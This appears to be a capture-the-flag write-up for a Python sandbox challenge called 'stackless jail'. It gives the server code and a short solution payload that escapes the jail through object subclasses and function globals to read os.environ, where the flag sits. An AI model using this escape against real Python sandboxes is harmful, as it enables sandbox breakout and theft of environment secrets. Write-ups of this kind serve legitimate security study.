# stackless jail

made by other quasar and A~Z

## challenge

server.py
```py
import dis
del __builtins__.__dict__['breakpoint']
del __builtins__.__dict__['help']

print("Welcome to the python calculator!", "Pls No Steal My Flag Which Is In An Environment Variable :<", sep='\n')

if __name__ == '__main__':
    try:
        math = input('> ')
        info = dis.code_info(math).split("\n")
        assert "Stack size:        1" in info

        exec(math, {}, results := {})
        for var, res in results.items():
            print(f"{var} = {res}")
    except:
        print("smh")

# Server: python 3.8
```

## solution

```py
payload = [
    'x = object.__subclasses__',
    '_ = x()',
    'x = _.pop'
] + ['x()']*36 + [
    '_ = x()', # os._wrap_close
    'x = _.__init__.__globals__.values',
    '*_, = x()',
    'x = _.pop'
] + ['x()']* 196 + [
    '_ = x()'  # os.environ
]

print(*payload, sep=';')
```

Repeatedly call pop to traverse lists, and use \\r (or `;`) to submit multiple lines inside of the one input.

